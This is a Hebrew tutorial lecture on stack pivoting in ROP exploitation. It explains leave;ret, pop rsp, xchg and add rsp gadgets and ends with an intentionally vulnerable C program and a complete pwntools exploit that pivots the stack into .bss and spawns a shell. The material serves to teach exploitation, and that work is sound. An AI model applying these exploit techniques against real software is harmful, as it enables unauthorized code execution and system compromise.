עד עכשיו בנינו שרשראות ROP והנחנו בשקט שיש לנו מספיק מקום על המחסנית כדי לפרוש אותן. בעולם האמיתי זה כמעט אף פעם לא המצב. הרבה פעמים הגלישה קצרה - יש לכם שליטה על כתובת החזרה ועוד סלוט אחד או שניים, וזהו. שרשרת ניצול אמיתית (דליפת libc, קריאה ל-`system`, טיפול ביישור המחסנית) פשוט לא נכנסת במרחב כזה. בהרצאה הזו נלמד את הטריק שפותר בדיוק את הבעיה הזו: הזזת המחסנית - stack pivoting. הרעיון הוא להזיז את `rsp` לאזור זיכרון אחר שאנחנו שולטים בו, אזור שבו כבר הכנו מראש שרשרת ROP ארוכה ומלאה.

## הבעיה - כשאין מספיק מקום לשרשרת

בואו נדייק את התרחיש. נניח חוצץ של 64 בתים, ואחריו על המחסנית יש את ה-`saved rbp` (8 בתים) ואת כתובת החזרה (8 בתים). הפונקציה שקוראת את הקלט קוראת בדיוק 80 בתים - לא יותר:

```text
כתובות גבוהות
+---------------------------+
| כתובת חזרה - return addr  |  <-- בתים 72..79, השליטה שלנו נגמרת כאן
+---------------------------+
| saved rbp                 |  <-- בתים 64..71
+---------------------------+
| char buf[64]              |  <-- בתים 0..63
+---------------------------+
כתובות נמוכות
```

יש לנו בדיוק מספיק כדי לדרוס את `saved rbp` ואת כתובת החזרה, ואפס בתים אחריהם. איך נבנה שרשרת ROP במרחב כזה? שרשרת ret2libc צנועה דורשת לפחות ארבעה סלוטים: `pop rdi ; ret`, כתובת של `/bin/sh`, גאדג'ט `ret` ליישור, וכתובת `system`. זה 32 בתים של שרשרת - שאין לנו לאן לשים.

הפתרון הוא לא לדחוס את השרשרת לתוך הגלישה הקצרה, אלא להשתמש בגלישה הקצרה רק כדי לבצע קפיצה אחת חכמה: להזיז את `rsp` לאזור אחר, גדול וכתיב, שבו כבר מחכה השרשרת המלאה.

## מה זה הזזת מחסנית - stack pivot

הרעיון פשוט ברמת העיקרון: `rsp` הוא זה שקובע מאיפה `ret` שולף את הכתובת הבאה. אם נשלוט ב-`rsp`, נשלוט לחלוטין באיזו "מחסנית" הפרוססור מבצע. אז במקום להריץ את השרשרת מהמחסנית האמיתית, נגרום ל-`rsp` להצביע לאזור שהכנו מראש - למשל אל תוך ה-`bss` או ה-heap - ומשם השרשרת תרוץ בלי מגבלת גודל.

```text
מחסנית אמיתית (מקום קטן)          אזור מבורג'ן ב-bss (מקום גדול)
+------------------------+       +---------------------------+
| ...buf...              |       | pop rdi ; ret             |
| saved rbp  (נדרס)      |       | כתובת "/bin/sh"           |
| return addr (נדרס)     | ===>  | ret  (יישור)              |
+------------------------+       | system                    |
   pivot מזיז את rsp לכאן        | ...ואפשר עוד ועוד...       |
                                 +---------------------------+
```

התהליך תמיד מתחלק לשני חלקים:

1. **כתיבת השרשרת הגדולה** אל אזור בכתובת ידועה וכתיבה (בדרך כלל `bss`, לפעמים heap).
2. **הפיבוט** - להשתמש בגלישה הקצרה כדי להזיז את `rsp` אל אותו אזור.

## שלב ראשון - להכין את השרשרת מראש

לפני שאפשר להזיז את המחסנית לאן שהוא, צריך שבמקום ההוא כבר תשב שרשרת. מאיפה היא מגיעה? כמעט תמיד יש בתוכנית קריאת קלט שנכתבת לאזור נתונים גלובלי בכתובת קבועה. לדוגמה:

```c
char stage[0x400];              // מערך גלובלי גדול ב-bss

void vuln() {
    char buf[64];
    read(0, stage, 0x400);      // כאן אנחנו כותבים את השרשרת המלאה
    read(0, buf, 80);           // הגלישה הקצרה - רק לפיבוט
}
```

הקריאה הראשונה ל-`stage` נותנת לנו לכתוב עד 0x400 בתים אל כתובת קבועה (כי אין PIE, ה-`bss` יושב במקום ידוע). לשם נכתוב את השרשרת הארוכה. הקריאה השנייה, הפגיעה, היא הקצרה - ובה נשתמש רק כדי לבצע את הפיבוט. שימו לב לסדר: קודם ממלאים את הבמה, ורק אחר כך מפוצצים - כך שברגע שהפונקציה חוזרת, השרשרת כבר במקומה.

את הכתובת של אזור הבמה שולפים ישירות מהבינארי:

```python
from pwn import *
elf = ELF('./pivot')
stage = elf.symbols['stage']    # או elf.bss() לאזור bss כללי
log.info('stage @ %#x', stage)
```

## גאדג'טים לפיבוט - pivot gadgets

הלב של הטכניקה הוא הגאדג'ט שמזיז את `rsp`. יש כמה משפחות, וכדאי להכיר את כולן כי לא תמיד כל אחד מהן זמין בבינארי.

### הגאדג'ט - leave ; ret

זה הגאדג'ט הנפוץ ביותר לפיבוט, מהסיבה הפשוטה שהוא קיים כמעט בכל פונקציה - זה בדיוק האפילוג הסטנדרטי. חשוב להבין מה `leave` עושה:

```asm
leave    ; שקול ל:  mov rsp, rbp   ;  pop rbp
ret      ; שקול ל:  pop rip
```

כלומר `leave` מציב את `rsp` על הערך של `rbp`. אם נשלוט ב-`rbp`, נשלוט לאן `rsp` יקפוץ. וזו בדיוק הנקודה: בגלישה שלנו אנחנו דורסים את ה-`saved rbp`. בואו נעקוב בזהירות אחרי מה שקורה, כי כאן מתרחשות שתי פעולות `leave` ברצף.

נניח שדרסנו את `saved rbp` בכתובת אזור הבמה (`stage`), ואת כתובת החזרה בכתובת של גאדג'ט `leave ; ret`. עכשיו הפונקציה `vuln` מבצעת את האפילוג שלה, שגם הוא `leave ; ret`:

```text
epilogue של vuln:
  leave -> rsp = rbp (מצביע ל-saved rbp);  pop rbp -> rbp = stage,  rsp מצביע לכתובת החזרה
  ret   -> קופץ לגאדג'ט leave ; ret;        rbp כבר שווה ל-stage

הגאדג'ט leave ; ret (עכשיו rbp = stage):
  leave -> rsp = rbp = stage;  pop rbp -> rbp = [stage],  rsp = stage+8
  ret   -> קופץ אל [stage+8]  <-- הגאדג'ט הראשון בשרשרת שלנו!
```

שימו לב לפרט הקריטי: פעולת ה-`pop rbp` שבתוך ה-`leave` השני "אוכלת" את 8 הבתים הראשונים באזור הבמה. לכן השרשרת האמיתית מתחילה ב-`stage+8`, ואת 8 הבתים הראשונים ב-`stage` נשאיר כריפוד (למשל אפסים). כלומר, מה שנכתוב לאזור הבמה נראה כך:

```text
stage+0   : 8 בתים ריפוד  (נבלעים ב-pop rbp)
stage+8   : pop rdi ; ret
stage+16  : כתובת "/bin/sh"
stage+24  : ret            (יישור)
stage+32  : system
```

והמטען של הגלישה הקצרה נראה כך:

```python
payload  = b'A' * 64          # ריפוד עד saved rbp
payload += p64(stage)         # saved rbp נדרס לכתובת הבמה
payload += p64(leave_ret)     # כתובת החזרה נדרסת לגאדג'ט leave ; ret
```

### הגאדג'ט - pop rsp ; ret

זה הפיבוט הכי ישיר שיש. ההוראה `pop rsp` שולפת ערך מהמחסנית ישירות אל `rsp`:

```asm
pop rsp    ; rsp = הערך הבא על המחסנית
ret        ; pop rip מהכתובת החדשה של rsp
```

אם דרסנו את כתובת החזרה בכתובת של `pop rsp ; ret`, ומיד אחריה שמנו את כתובת הבמה, אז:

```text
return addr -> pop rsp ; ret
next slot   -> stage        (נשלף אל rsp)
```

אחרי ה-`pop rsp`, מתקיים `rsp = stage`, וה-`ret` שאחריו שולף את `[stage]` - כאן אין את בעיית ה-`pop rbp` הכפולה, אז השרשרת יכולה להתחיל כבר ב-`stage+0`. החיסרון: הגאדג'ט הזה (`5c c3` בקוד מכונה) הרבה פחות נפוץ מ-`leave ; ret`.

### הגאדג'ט - xchg rax, rsp ; ret

מחליף בין `rax` ל-`rsp`:

```asm
xchg rax, rsp    ; מחליף את הערכים של שני האוגרים
ret
```

הגאדג'ט הזה מבריק כשיש לנו כבר שליטה על `rax`. מתי זה קורה? ערך ההחזרה של פונקציות מגיע ב-`rax`. לדוגמה, `read` מחזיר את מספר הבתים שנקראו, ו-`gets`/`fgets` מחזירים מצביע לחוצץ. אם נצליח לגרום ל-`rax` להכיל את כתובת הבמה שלנו (למשל דרך גאדג'ט `pop rax ; ret`, או דרך ערך החזרה של קריאה), אז `xchg rax, rsp ; ret` מפנה את המחסנית לשם בבת אחת.

### הגאדג'ט - add rsp, N ; ret

זה לא באמת "פיבוט" לאזור אחר, אלא הזזה יחסית של המחסנית:

```asm
add rsp, 0x40    ; מזיז את rsp קדימה ב-0x40 בתים
ret
```

מתי זה שימושי? כשהשרשרת שלנו קטועה על ידי משהו באמצע (למשל בתים שנחסמים), או כשרוצים "לדלג" מעל אזור על המחסנית. יש גם את התאום `sub rsp, N ; ret` להזזה אחורה. ההוראות האלה שימושיות גם ליישור עדין של המחסנית לפני קריאה ל-`system`.

## איך מוצאים את גאדג'טי הפיבוט

הכל דרך `ROPgadget` או `ropper`, עם `grep` ממוקד:

```bash
# leave ; ret - כמעט תמיד קיים
ROPgadget --binary ./pivot | grep ': leave ; ret'

# pop rsp - נדיר יותר
ROPgadget --binary ./pivot | grep 'pop rsp'

# xchg עם rsp
ROPgadget --binary ./pivot | grep 'xchg' | grep 'rsp'

# הזזות יחסיות
ROPgadget --binary ./pivot | grep -E 'add rsp|sub rsp'
```

הספרייה pwntools יודעת גם לעשות את זה בשבילכם עם `rop.find_gadget(['leave'])`, ואפילו יש לה פונקציית `rop.migrate(new_sp)` שבונה פיבוט אוטומטי. בשלב הלימוד עדיף לבנות ידנית כדי להבין מה קורה.

## דוגמה מלאה מקצה לקצה

בואו נחבר הכל על בינארי אמיתי. ההגנות: `NX` פעיל (אז אנחנו ב-ROP), בלי קנרי (הגלישה עובדת), בלי PIE (כתובות הבמה והגאדג'טים קבועות). את ASLR אפשר להשאיר פעיל כי כל הכתובות שלנו מגיעות מהבינארי עצמו, לא מ-libc.

```c
// pivot.c
// gcc -fno-stack-protector -no-pie -o pivot pivot.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char stage[0x400];                  // אזור bss גדול לבמה

void unused() {
    system("/bin/echo dummy");      // רק כדי לגרור את system ו-"/bin/sh" לבינארי
}

void vuln() {
    char buf[64];
    write(1, "stage:\n", 7);
    read(0, stage, 0x400);          // ממלאים את הבמה בשרשרת המלאה
    write(1, "overflow:\n", 10);
    read(0, buf, 80);               // גלישה קצרה - בדיוק עד סוף כתובת החזרה
}

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

בודקים הגנות ומאתרים את הרכיבים:

```bash
$ checksec --file=./pivot
RELRO           STACK CANARY   NX            PIE
Partial RELRO   No canary      NX enabled    No PIE

$ ROPgadget --binary ./pivot | grep ': leave ; ret'
0x0000000000401185 : leave ; ret

$ ROPgadget --binary ./pivot | grep 'pop rdi ; ret'
0x0000000000401263 : pop rdi ; ret
```

ועכשיו ה-exploit המלא ב-pwntools:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./pivot')

stage     = elf.symbols['stage']
leave_ret = 0x401185
pop_rdi   = 0x401263
ret       = 0x40101a                       # גאדג'ט ret בודד ליישור
binsh     = next(elf.search(b'/bin/sh\x00'))
system    = elf.plt['system']

# שלב 1 - השרשרת המלאה שתשב באזור הבמה.
# 8 בתים ריפוד בהתחלה כי pop rbp של leave;ret השני יבלע אותם.
chain  = p64(0)                            # ריפוד שנבלע ב-pop rbp
chain += p64(pop_rdi)
chain += p64(binsh)
chain += p64(ret)                          # יישור מחסנית ל-16 בתים
chain += p64(system)

# שלב 2 - הגלישה הקצרה שמבצעת את הפיבוט.
pivot  = b'A' * 64                         # ריפוד עד saved rbp
pivot += p64(stage)                        # saved rbp -> כתובת הבמה
pivot += p64(leave_ret)                    # return addr -> leave ; ret

p = process('./pivot')
p.recvuntil(b'stage:')
p.send(chain)                              # כותבים את השרשרת אל stage
p.recvuntil(b'overflow:')
p.send(pivot)                              # מפעילים את הפיבוט
p.interactive()
```

מה קורה כשמריצים? הקריאה הראשונה כותבת את `chain` אל `stage`. הקריאה השנייה דורסת את `saved rbp` בכתובת `stage` ואת כתובת החזרה בכתובת של `leave ; ret`. כש-`vuln` חוזרת, ה-`leave ; ret` שלה מעביר את `rbp` ל-`stage`, וה-`leave ; ret` שהפניתי אליו מזיז את `rsp` אל `stage` ומתחיל להריץ את השרשרת מ-`stage+8`. השרשרת טוענת ל-`rdi` את כתובת `/bin/sh` וקוראת ל-`system`. התוצאה: shell.

## טעויות נפוצות ואבחון

- שכחתם את הריפוד של 8 הבתים בתחילת הבמה. אז ה-`pop rbp` בולע את הגאדג'ט הראשון שלכם, וה-`ret` קופץ לכתובת של `/bin/sh` - קריסה מיידית. אם אתם מפצחים בעזרת `pop rsp ; ret` במקום `leave ; ret`, הריפוד הזה מיותר.
- קריסה בתוך `system` על `movaps`. זו בעיית יישור מוכרת מפרק ה-ROP הבסיסי. הוסיפו או הסירו גאדג'ט `ret` בודד לפני הקריאה ל-`system` כדי ליישר את `rsp` ל-16 בתים.
- הבמה לא כתיבה. אם בחרתם אזור שאינו rw (למשל `.text`), הכתיבה תיכשל. ודאו שהכתובת שבחרתם נמצאת ב-`bss`/`.data`/heap. אפשר לאמת עם `vmmap` ב-pwndbg.
- ה-`saved rbp` לא באמת בשליטתכם. אם ה-offset שלכם שגוי, אתם דורסים את הדבר הלא נכון. תמיד מדדו את ה-offset עם `cyclic` לפני שאתם מסתמכים עליו.
- שכחתם שהבמה חייבת להיכתב לפני שהפונקציה חוזרת. אם הפכתם את סדר הקריאות, אין שרשרת לקפוץ אליה. הסדר תמיד: קודם ממלאים את הבמה, אחר כך מפוצצים.

## סיכום

- כשהגלישה קצרה מדי לשרשרת מלאה, מזיזים את המחסנית - stack pivot - לאזור גדול שאנחנו שולטים בו.
- העבודה תמיד בשני שלבים: כותבים את השרשרת הארוכה מראש לכתובת ידועה וכתיבה (בדרך כלל `bss`), ואז משתמשים בגלישה הקצרה כדי להזיז את `rsp` לשם.
- הגאדג'ט `leave ; ret` הוא הפיבוט הנפוץ ביותר כי הוא קיים בכל אפילוג. הוא שולט ב-`rsp` דרך ה-`saved rbp` שדרסנו, אבל שימו לב ל-`pop rbp` הכפול שבולע 8 בתים.
- `pop rsp ; ret` הוא הפיבוט הישיר והנקי ביותר, אבל נדיר. `xchg rax, rsp ; ret` שימושי כשיש שליטה על `rax`. `add rsp, N ; ret` מזיז את המחסנית יחסית.
- מוצאים את הגאדג'טים עם `ROPgadget | grep`, ומאמתים את הפיבוט ב-gdb על ידי צפייה ב-`rsp` אחרי כל `ret`.
- ההנחות: `NX` פעיל, בלי קנרי, בלי PIE (או עם דליפה שמגלה את הכתובות). כשהבמה ב-libc או תלויה ב-ASLR, נצטרך קודם דליפה - נגיע לזה בשיעורים הבאים.
